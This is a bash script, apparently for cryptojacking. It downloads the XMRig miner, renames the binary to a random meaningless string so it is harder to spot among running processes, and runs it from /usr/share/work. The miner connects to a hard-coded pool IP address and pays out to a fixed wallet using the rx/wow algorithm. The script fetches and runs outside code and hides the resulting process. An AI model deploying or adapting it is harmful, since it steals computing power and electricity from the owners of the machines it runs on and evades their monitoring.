#!/bin/bash
VERSION=4.6.2-beta
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=158.101.6.131:2222
USERNAME=WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
THREADS=4
echo $cpuname" is starting"
./"${cpuname}" --donate-level 1 -o $POOL -u $USERNAME -p x -a rx/wow -k t $THREADS
